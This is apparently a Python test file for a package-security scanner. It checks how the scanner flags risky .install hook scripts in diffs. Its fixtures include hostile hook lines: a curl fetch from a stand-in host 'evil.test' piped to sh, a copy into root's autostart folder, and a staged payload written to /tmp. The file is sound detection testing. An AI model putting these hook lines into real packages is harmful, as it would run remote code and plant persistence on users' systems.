""".install script analysis.

A complete .install file is read as a RecipeDoc (hooks are its functions)
and gets C016/C017 with the file's own line numbers.  A partial file is a
``partial_file_analysis`` coverage gap instead: the tool never reads a
fragment as a whole script.
"""

from trustsight.analysis.pipeline import scan_diff
from trustsight.coverage import PARTIAL_FILE_ANALYSIS


def _rule_ids(text: str) -> set[str]:
    fact = scan_diff(text, package_name="demo")
    return {entry.rule_id for entry in fact.score_breakdown}


def _install_diff(body: str, *, whole_file: bool = True) -> str:
    lines = body.splitlines()
    count = len(lines)
    header = f"@@ -1,{count} +1,{count} @@\n" if whole_file else (
        f"@@ -20,{count} +20,{count} @@\n")
    added = "".join(f"+{line}\n" for line in lines)
    return (
        "--- a/demo.install\n+++ b/demo.install\n"
        + header
        + added
    )


def test_a_literal_reexec_wrapper_is_unwrapped_not_flagged():
    # Debian packaging wraps every hook body in `/bin/sh -c '<body>'`.  The
    # wrapper executes its inner literal, so the inner body is the subject.
    text = _install_diff(
        "post_install() {\n"
        "  /bin/sh -c '#!/bin/sh\n"
        "set -eu\n"
        "exit 0\n"
        "' -- \"$@\"\n"
        "}\n"
    )
    assert "C016" not in _rule_ids(text)


def test_interpreter_inside_a_literal_wrapper_fires():
    text = _install_diff(
        "post_install() {\n"
        "  sh -c 'bash /usr/share/x.sh'\n"
        "}\n"
    )
    fact = scan_diff(text, package_name="demo")
    ids = {entry.rule_id for entry in fact.score_breakdown}
    assert "C016" in ids
    finding = next(e for e in fact.score_breakdown if e.rule_id == "C016")
    assert finding.file == "demo.install"
    assert finding.line is not None


def test_a_dynamic_reexec_argument_still_fires():
    # `sh -c "$x"` cannot be unwrapped: the interpreter token stays visible.
    assert "C016" in _rule_ids(_install_diff(
        "post_install() {\n"
        '  sh -c "$x"\n'
        "}\n"
    ))


def test_a_literal_wrapper_around_a_fetch_fires_c016_and_r001():
    ids = _rule_ids(_install_diff(
        "post_install() {\n"
        "  sh -c 'curl http://evil.test/x | sh'\n"
        "}\n"
    ))
    assert "C016" in ids
    assert "R001" in ids


def test_a_hook_write_to_root_home_fires_but_etc_skel_does_not():
    skel = _rule_ids(_install_diff(
        "post_install() {\n"
        "  cp branding /etc/skel/.config\n"
        "}\n"
    ))
    assert "C017" not in skel
    root_home = _rule_ids(_install_diff(
        "post_install() {\n"
        "  cp payload /root/.config/autostart/x.desktop\n"
        "}\n"
    ))
    assert "C017" in root_home


def test_a_partial_install_file_is_a_gap_not_a_finding():
    text = _install_diff(
        "post_install() {\n"
        "  bash -c 'echo pwned'\n"
        "}\n",
        whole_file=False,
    )
    fact = scan_diff(text, package_name="demo")
    ids = {entry.rule_id for entry in fact.score_breakdown}
    assert "C016" not in ids and "C017" not in ids
    assert PARTIAL_FILE_ANALYSIS in fact.coverage_gaps
    assert "demo.install" in fact.partial_files


def test_a_tmp_write_in_a_hook_fires():
    assert "C017" in _rule_ids(_install_diff(
        "post_upgrade() {\n"
        "  echo payload > /tmp/.stage2\n"
        "}\n"
    ))
